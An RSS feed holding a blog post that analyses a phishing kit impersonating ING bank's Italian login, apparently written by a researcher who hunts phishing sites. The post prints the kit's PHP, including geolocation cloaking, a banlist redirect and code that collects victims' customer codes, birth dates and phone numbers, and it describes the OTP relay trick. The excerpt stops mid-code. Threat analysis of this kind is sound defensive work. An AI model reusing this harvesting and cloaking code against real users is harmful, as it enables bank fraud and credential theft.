<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>andpalmier</title>
    <link>/</link>
    <description>Recent content on andpalmier</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Mon, 12 Apr 2021 00:00:00 +0000</lastBuildDate>
    
	<atom:link href="/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Phishing findings, campaign #3: ING bank</title>
      <link>/posts/phishing-findings-3/</link>
      <pubDate>Mon, 12 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>/posts/phishing-findings-3/</guid>
      <description>&lt;figure&gt;&lt;img src=&#34;/images/posts/phishing-findings/sampei.jpeg&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;I started hunting and reporting phishing websites on Twitter: follow me &lt;a href=&#34;https://twitter.com/andpalmier&#34;&gt;here&lt;/a&gt; if you are interested!
In this series of posts I am going to analyze and discuss some of the phishing kits found online.&lt;/p&gt;
&lt;h2 id=&#34;lets-start-from-the-beginning&#34;&gt;Let&amp;rsquo;s start from the beginning&lt;/h2&gt;
&lt;p&gt;I found this kit while analyzing the phishing sites reported by &lt;a href=&#34;https://twitter.com/illegalfawn&#34;&gt;@illegalfawn&lt;/a&gt;. The zip was left exposed in the page, I believe the malicious actor forgot to remove it.&lt;/p&gt;
&lt;p&gt;The name of the zip is interesting: &lt;code&gt;POSTEITASLIANE.zip&lt;/code&gt;. For non Italians, the name is referring to &lt;a href=&#34;https://posteitaliane.it&#34;&gt;Poste Italiane&lt;/a&gt;, the Italian postal service provider, which also offers financial services and is often target of phishing pages.&lt;/p&gt;
&lt;p&gt;Besides having a typo in the name of the service, the kit - surprisingly - is not targeting Poste Italiane, but ING bank.&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/phishing-findings/ep3/ing.png&#34;
         alt=&#34;The phishing page&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;The phishing page&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h2 id=&#34;exploring-the-kit&#34;&gt;Exploring the kit&lt;/h2&gt;
&lt;p&gt;This kit is quite large, as it contains 475 files and 48 directories. Many items are taken directly from the Italian ING webpage, such as images, stylesheet files and JS scripts.&lt;/p&gt;
&lt;p&gt;If we check the metadata of the other files, we can see that they were modified on the 4th of March, indicating that this kit is recent:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ mdls index.php
_kMDItemDisplayNameWithExtensions      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;index.php&amp;#34;&lt;/span&gt;
kMDItemContentCreationDate             &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 2021-03-04 16:16:56 +0000
kMDItemContentCreationDate_Ranking     &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 2021-03-04 00:00:00 +0000
kMDItemContentModificationDate         &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 2021-03-04 16:16:56 +0000
kMDItemContentModificationDate_Ranking &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 2021-03-04 00:00:00 +0000
kMDItemContentType                     &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;public.php-script&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;indexphp&#34;&gt;index.php&lt;/h3&gt;
&lt;p&gt;The entry point of the kit is &lt;code&gt;index.php&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;session_start&lt;/span&gt;();
$ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;];
$hash &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;md5&lt;/span&gt;($ip);
$url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://www.geoplugin.net/json.gp?ip=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$ip&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;url_get_contents&lt;/span&gt;($url) {
    $ch &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;curl_init&lt;/span&gt;($url);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;curl_setopt&lt;/span&gt;($ch, &lt;span style=&#34;color:#a6e22e&#34;&gt;CURLOPT_RETURNTRANSFER&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;curl_setopt&lt;/span&gt;($ch, &lt;span style=&#34;color:#a6e22e&#34;&gt;CURLOPT_FOLLOWLOCATION&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;curl_setopt&lt;/span&gt;($ch, &lt;span style=&#34;color:#a6e22e&#34;&gt;CURLOPT_SSL_VERIFYPEER&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;curl_setopt&lt;/span&gt;($ch, &lt;span style=&#34;color:#a6e22e&#34;&gt;CURLOPT_SSL_VERIFYHOST&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
    $data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;curl_exec&lt;/span&gt;($ch);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;curl_close&lt;/span&gt;($ch);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; $data;
}
$json &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;url_get_contents&lt;/span&gt;($url);
$json &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;json_decode&lt;/span&gt;($json, &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);
$country &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $json[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;geoplugin_countryName&amp;#39;&lt;/span&gt;];
&lt;span style=&#34;color:#75715e&#34;&gt;# if($country == &amp;#34;Italy&amp;#34; || $country == &amp;#34;United Kingdom&amp;#34; || $country == &amp;#34;Bulgaria&amp;#34;)  {
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
$ban_file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;logs/banlist.txt&amp;#34;&lt;/span&gt;;
$list &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;($ban_file, &lt;span style=&#34;color:#a6e22e&#34;&gt;FILE_IGNORE_NEW_LINES&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;FILE_SKIP_EMPTY_LINES&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;in_array&lt;/span&gt;($ip, $list)) {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Location: https://www.google.com&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;();
} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
    $_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;auth&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Location: login.php?&amp;amp;sessionid=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$hash&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;amp;securessl=true&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;();
}
&lt;span style=&#34;color:#75715e&#34;&gt;#}
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# else  {
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# header(&amp;#39;Location: https://www.google.com&amp;#39;);
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Part of the code is commented out, indicating that the developer was testing different approaches.&lt;/p&gt;
&lt;p&gt;In the lines above, the kit uses &lt;a href=&#34;https://geoplugin.net&#34;&gt;geoplugin.net&lt;/a&gt; to detect the country from which the victim is connecting by using the IP address; this technique is quite common for phishing kits. We can see from the comments, that the actor was probably targeting victims from Italy, UK and Bulgaria.&lt;/p&gt;
&lt;p&gt;The code is then referring to a file called &lt;code&gt;banlist.txt&lt;/code&gt;, which should contains a list of IP addresses to be blocked. If the IP of the visitor of the page is in this list, the page will redirect to Google. &lt;code&gt;banlist.txt&lt;/code&gt; is not in the zip file, but we can assume it contains a list of IP addresses of known sandboxes, just like it was done for the &lt;a href=&#34;https://www.andpalmier.com/posts/phishing-findings-2/&#34;&gt;LinkedIn kit analyzed in a previous post&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In case the IP address of the victim is not in &lt;code&gt;banlist.txt&lt;/code&gt;, the visitor is redirected to &lt;code&gt;login.php&lt;/code&gt; with a new session ID, obtained from the md5 hash of the IP address.&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/phishing-findings/ep3/login.png&#34;
         alt=&#34;login.php&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;login.php&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;The victim, by clicking on the link, is presented the page above, saying that the account of the visitor has been disabled temporarily for security reasons. If we click on the button, the message disappears, and we are now presented with a page asking for our client ID, birth date and phone number (you can see a screenshot of this page at the very beginning of this post).&lt;/p&gt;
&lt;p&gt;Interestingly, the page presents itself with a paragraph, on the left, where it says that &lt;em&gt;&amp;ldquo;the codes entered will be doubly protected against phishing and spyware&amp;rdquo;&lt;/em&gt;, because after the visitor enters the login details, &amp;ldquo;&lt;em&gt;it will be shown information which only ING can have&amp;rdquo;&lt;/em&gt;. Of course, this dialog is copied directly from the original ING login page for Italian customers, which you can see below:&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/phishing-findings/ep3/realing.png&#34;
         alt=&#34;Real ING login page for Italian customers&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Real ING login page for Italian customers&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;Actually, a lot of the code of the page is copied directly from the original ING login page, but - of course - there are some small changes, especially in the forms.&lt;/p&gt;
&lt;p&gt;Here is the form from the original ING page:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;form&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aspnetform&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;post&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;action&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./loginsso.aspx&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;onsubmit&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;javascript
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:return webform_onsubmit();&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aspnetform&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;vvc_form_enabled&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;while this is the one of the kit:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;form&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aspnetForm&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;post&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;action&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pin.php?&amp;amp;sessionid=&amp;lt;?php echo &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$hash&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;; ?&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;amp;securessl=true&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;onsubmit&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;javascript:return WebForm_OnSubmit();&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aspnetForm&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;vvc_form_enabled&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;action&lt;/code&gt; attribute is different and - again - we see a submission with the parameters &lt;code&gt;sessionid&lt;/code&gt; and &lt;code&gt;securessl&lt;/code&gt;, with the first still being the hash of the IP address of the visitor.
The fields submitted to the form are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Customer code, with input name &lt;code&gt;ctl00\$cphContenuto\$Login ContainerUC1\$LoginStepCifUC1\$txtcc&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Birth date, with input name &lt;code&gt;ctl00\$cphContenuto\$Login ContainerUC1\$LoginStepCifUC1\$txtgg&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Phone number, with input name &lt;code&gt;ctl00\$cphContenuto\$Login ContainerUC1\$LoginStepCifUC1\$txt&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;pinphp&#34;&gt;pin.php&lt;/h3&gt;
&lt;p&gt;Let&amp;rsquo;s see how they are used in &lt;code&gt;pin.php&lt;/code&gt;:&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/phishing-findings/ep3/pin.png&#34;
         alt=&#34;pin.php&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;pin.php&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;This page is asking for an OTP code that the victim should have received via SMS. This means that the actor is - either manually or with an automated agent - performing the login access to ING Bank with the credentials of the victim while the victim is still on the phishing page: otherwise the OTP code would expire and not useful for signing in. If the mechanics seems a bit confusing, don&amp;rsquo;t worry, I will make a summary of the details of the process before the conclusion of this post!&lt;/p&gt;
&lt;p&gt;For now, let&amp;rsquo;s focus on the code, here is the beginning of the PHP for &lt;code&gt;pin.php&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;auth&amp;#39;&lt;/span&gt;])) {
   &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Location: http://www.google.com&amp;#34;&lt;/span&gt;);
   &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;();
}

$v_ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;];
$hash &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;md5&lt;/span&gt;($v_ip);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In the code above, the page is - once again - redirecting visitors which do not have the &lt;code&gt;auth&lt;/code&gt; parameter to Google, to avoid detection.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;empty&lt;/span&gt;($_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtcc&amp;#39;&lt;/span&gt;])) {
    $codclient &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtcc&amp;#39;&lt;/span&gt;];
    $_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;codclient&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $codclient;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;empty&lt;/span&gt;($_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtgg&amp;#39;&lt;/span&gt;])) {
    $giorno &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtgg&amp;#39;&lt;/span&gt;];
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;empty&lt;/span&gt;($_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtmm&amp;#39;&lt;/span&gt;])) {
    $mese &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtmm&amp;#39;&lt;/span&gt;];
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;empty&lt;/span&gt;($_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtaa&amp;#39;&lt;/span&gt;])) {
    $anno &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtaa&amp;#39;&lt;/span&gt;];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This section is taking the parameters sent from &lt;code&gt;login.php&lt;/code&gt; and assigning them to variables with Italian names, so far we have assigned data for the customer ID, the day, the month and the year of the specified birth date.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;empty&lt;/span&gt;($_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txt&amp;#39;&lt;/span&gt;])) {
    $telefono &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txt&amp;#39;&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;includes/my_email.php&amp;#34;&lt;/span&gt;;

    &lt;span style=&#34;color:#a6e22e&#34;&gt;date_default_timezone_set&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Europe/London&amp;#39;&lt;/span&gt;);
    $ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;];
    $time &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;date&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m-d-Y g:i:a&amp;#34;&lt;/span&gt;);
    $agent &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTTP_USER_AGENT&amp;#39;&lt;/span&gt;];

    $msg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+ ------------------------------------------+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $msg &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+ Dati Login per &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$username\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $msg &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+ ------------------------------------------+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $msg &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;| codcliente: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$codclient&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $msg &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;| giorno: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$giorno&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $msg &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;| mese: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$mese&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
